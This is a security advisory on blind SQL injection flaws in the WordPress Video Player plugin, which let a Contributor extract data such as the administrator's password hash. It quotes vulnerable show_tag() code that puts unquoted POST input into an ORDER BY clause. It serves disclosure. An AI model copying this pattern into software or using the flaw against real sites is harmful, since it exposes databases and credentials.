Introduction

WordPress Video Player is a WordPress video plugin that allows you to easily add videos to your website. WordPress Video Player is affected by multiple blind SQL injection vulnerabilities. Using these issues it is possible for a logged on Contributor (or higher) to extract arbitrary data (eg, the Administrator's password hash) from the WordPress database.

Details

The vulnerabilities exist in the functions show_tag(), spider_video_select_playlist(), and spider_video_select_video(). The author tried to prevent SQL injection by calling the esc_sql() WordPress function. However, the user input is used in the ORDER BY clause and is consequently not quoted. Due to this it is possible to inject arbitrary SQL statements despite the use of esc_sql()

show_tag():

if (isset($_POST['page_number'])) {
   if ($_POST['asc_or_desc']) {
      $sort["sortid_by"] = esc_sql(esc_html(stripslashes($_POST['order_by'])));
      if ($_POST['asc_or_desc'] == 1) {
         $sort["custom_style"] = "manage-column column-title sorted asc";
         $sort["1_or_2"] = "2";
         $order = "ORDER BY " . $sort["sortid_by"] . " ASC";
      } else {
         $sort["custom_style"] = "manage-column column-title sorted desc";
         $sort["1_or_2"] = "1";
         $order = "ORDER BY " . $sort["sortid_by"] . " DESC";
      }
   }
